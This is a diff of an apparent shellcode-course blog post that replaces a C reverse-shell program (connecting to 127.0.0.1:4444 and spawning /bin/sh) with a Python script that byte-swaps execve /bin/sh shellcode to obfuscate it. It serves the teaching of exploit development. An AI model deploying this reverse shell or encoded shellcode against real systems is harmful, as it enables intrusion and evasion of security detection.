@@ -37,37 +37,45 @@ A true Insertion Encoder would insert junk data with more complex algorithms to 
 
 The execve-stack shellcode from the course material will be used as a reference for the shellcode in use, this shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell. 
 
-The following Python code will be used as a shellcode wrapper: 
+The following Python code will be used as a shellcode wrapper to generate the obfuscated shellcode from the original shellcode: 
 
 ```python
-#include <stdio.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
+#!/usr/bin/python
 
-int main(void) {
-    // Declare variables
-    int sockfd;
-    struct sockaddr_in serv_addr;
-    // Create socket
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    // IP address family
-    serv_addr.sin_family = AF_INET;
-    // Destination IP address
-    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-    // Destination port 
-    serv_addr.sin_port = htons(4444);
-    // Reverse connect to target IP address
-    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
-    int i;
-    for (i=0; i <= 2; i++){
-        dup2(sockfd, i);
-    }
-    // Execute /bin/sh using execve  
-    char *argv[] = {"/bin/sh", NULL};
-    execve(argv[0], argv, NULL);
-}
+# Filename: encoder.py
+# Author: h3ll0clar1c3
+# Purpose: Wrapper script to generate obfuscated shellcode from the original shellcode
+# Usage: python encoder.py 
+
+#execve-stack shellcode to spawn /bin/sh shell
+shellcode = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f"
+shellcode += "\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+print '\nShellcode length: %d bytes\n'  % len(shellcode)
+s2 = ''
+
+for x in bytearray(shellcode):
+    s2 += '0x%02x,' % x
+
+s2 = s2.rstrip(',')
+print 'Original shellcode:\n'
+print s2
+print '\nObfuscated shellcode:\n'
+
+s2n = s2.split(',')
+encoded = ''
+i = 1
+for s in s2n:
+    if i == 1:
+        a = s
+    elif i == 2:
+        encoded += '%s,' % s
+        encoded += '%s,' % a
+        i = 1
+        continue
+    i += 1
+
+print encoded.rstrip(',')
 ```
 
 #### POC (C Code)
